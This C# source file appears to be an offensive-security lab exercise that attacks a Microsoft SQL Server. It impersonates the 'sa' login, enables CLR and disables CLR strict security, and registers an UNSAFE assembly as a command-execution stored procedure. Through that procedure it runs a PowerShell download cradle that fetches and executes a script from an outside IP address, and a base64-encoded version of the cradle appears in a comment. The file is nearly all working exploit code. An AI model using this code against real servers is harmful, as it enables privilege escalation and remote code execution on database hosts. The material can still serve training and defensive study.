using System;
using System.Data.SqlClient;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MSSQL___RunAssembly
{
    class runassembly
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            //Authenticates
            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            //Login impersonation
            String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
            //Enabling assembly
            String enable_assembly = "use msdb; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE;";
            //Create Assembly and import DLL
            //String assembly = "CREATE ASSEMBLY myAssembly FROM 'c:\\tools\\assembly.dll' WITH PERMISSION_SET = UNSAFE;";
            //dll converted to hex. Ver script dlltohex.ps1 del ejercicio 15.2.3
            String assembly = "CREATE ASSEMBLY myAssembly FROM  WITH PERMISSION_SET = UNSAFE;";

            //Create Procedure
            String procedure = "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];";
            //Command to execute
            //String execCmd = "EXEC cmdExec 'whoami'";

            //Funciona bien
            String execCmd = "EXEC cmdExec 'powershell -C \"IEX((New-Object System.Net.WebClient).DownloadString(''http://192.168.49.179/run.txt''))\"'";

            // Funciona bien
            // Es "(New-Object System.Net.WebClient).DownloadString('http://192.168.49.179/run.txt') | IEX" en  codigo b64. Ver ejercicio 15.1.3 -> encodecradle.ps1 
            //String execCmd = "EXEC cmdExec 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADEANwA5AC8AcgB1AG4ALgB0AHgAdAAnACkAIAB8ACAASQBFAFgA'";


            //Delete procedure
            String delprocedure = "DROP PROCEDURE IF EXISTS [dbo].[cmdExec];";
            //Delete assembly
            String delassembly = "DROP ASSEMBLY IF EXISTS myAssembly;";


            //Execute impersonateUser
            SqlCommand command = new SqlCommand(impersonateUser, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            //Execute enable_assembly
            command = new SqlCommand(enable_assembly, con);
            reader = command.ExecuteReader();
            reader.Close();

            //Delete procedure (if exists)
            command = new SqlCommand(delprocedure, con);
            reader = command.ExecuteReader();
            reader.Close();

            //Delete assembly (if exists)
            command = new SqlCommand(delassembly, con);
            reader = command.ExecuteReader();
            reader.Close();

            //Creating Assembly
            command = new SqlCommand(assembly, con);
            reader = command.ExecuteReader();
            reader.Close();

            //Creating procedure
            command = new SqlCommand(procedure, con);
            reader = command.ExecuteReader();
            reader.Close();

            //Execute execCmd
            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            reader.Read();

            Console.WriteLine("Result of command is: " + reader[0]);
            reader.Close();

            con.Close();
        }
    }
}